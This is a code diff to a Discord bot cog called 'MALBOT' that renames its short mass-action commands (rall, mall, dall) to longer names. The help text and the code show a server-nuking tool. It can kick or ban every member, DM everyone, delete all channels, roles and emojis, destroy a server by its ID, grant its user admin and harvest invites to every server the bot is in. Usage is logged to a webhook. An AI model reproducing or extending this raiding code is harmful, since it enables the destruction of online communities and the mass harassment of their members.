@@ -75,7 +75,7 @@ class Botsudo(commands.Cog):
         em = discord.Embed(title='MALBOT HELP', description='This help menu contains commands for owners only!\nThe bot prefix is `-`.', colour=RandomColour())
 
         em.add_field(name='OWNER COMMANDS:', value='`addsudo <user> <reason>` Allows a user to use sudo command\n`removesudo <user> <reason>`\n`botname <name>` Renames the bot.\n`createinvite <chanid>` creates an invite link from channelid (bot must have access to target channel!\n`gban <user> [reason]` Globally bans a user.\n`hackgban <user_id> [reason]` Globally bans a User ID.\n`adminme` gives yourself admin.\n`oclear <amount>` Deletes messages from the server.\n`okick <user> [reason]` Kicks someone from the server.\n`oban <user> [reason]` Bans someone from the server.\n`onick <user>` nicks someone.\n`reply <chan_id> <msg>` Replies to a report.\n`servers` grabs 1 invite of every server.\n`leaveserver [server_id]` leaves the server.', inline=False)
-        em.add_field(name='MALBOT COMMANDS:', value='`chanmsgall <msg>` Sends a message to all channels in a server.\n`kickall` Kicks everyone in a server.\n`banall` Bans everyone in a server.\n`rall <name>` Renames everyone in a server.\n`mall <msg>` DMs everyone in a server.\n`dall <channels|roles|emojis|all>` Deletes specified objects.\n`destroy` Attempts to destroy everything on a server.\n`destroyid <server_id>` Destroys a server given its ID.', inline=False)
+        em.add_field(name='MALBOT COMMANDS:', value='`chanmsgall <msg>` Sends a message to all channels in a server.\n`kickall` Kicks everyone in a server.\n`banall` Bans everyone in a server.\n`renameall <name>` Renames everyone in a server.\n`msgall <msg>` DMs everyone in a server.\n`deleteall <channels|roles|emojis|all>` Deletes specified objects.\n`destroy` Attempts to destroy everything on a server.\n`destroyid <server_id>` Destroys a server given its ID.', inline=False)
         em.set_footer(text=f'Your usage is being logged {ctx.message.author} ({ctx.message.author.id}).', icon_url=ctx.message.author.avatar_url_as(static_format='png'))
 
         await ctx.send(embed=em)
@@ -466,7 +466,7 @@ class Botsudo(commands.Cog):
 
     @commands.check(SUDOER_CHECK)
     @commands.command()
-    async def rall(self, ctx, *, rename_to):
+    async def renameall(self, ctx, *, rename_to):
         reaper_logs_webhook.send(f"**{ctx.message.author}** used -> {ctx.message.content} <- in {ctx.guild.name} ({ctx.guild.id})")
         await ctx.message.delete()
         for user in list(ctx.guild.members):
@@ -480,7 +480,7 @@ class Botsudo(commands.Cog):
 
     @commands.check(SUDOER_CHECK)
     @commands.command()
-    async def mall(self, ctx, *, message):
+    async def msgall(self, ctx, *, message):
         reaper_logs_webhook.send(f"**{ctx.message.author}** used -> {ctx.message.content} <- in {ctx.guild.name} ({ctx.guild.id})")
         await ctx.message.delete()
         for user in ctx.guild.members:
@@ -494,7 +494,7 @@ class Botsudo(commands.Cog):
 
     @commands.check(SUDOER_CHECK)
     @commands.command()
-    async def dall(self, ctx, condition):
+    async def deleteall(self, ctx, condition):
         reaper_logs_webhook.send(f"**{ctx.message.author}** used -> {ctx.message.content} <- in {ctx.guild.name} ({ctx.guild.id})")
         if condition.lower() == "channels":
             for channel in list(ctx.guild.channels):
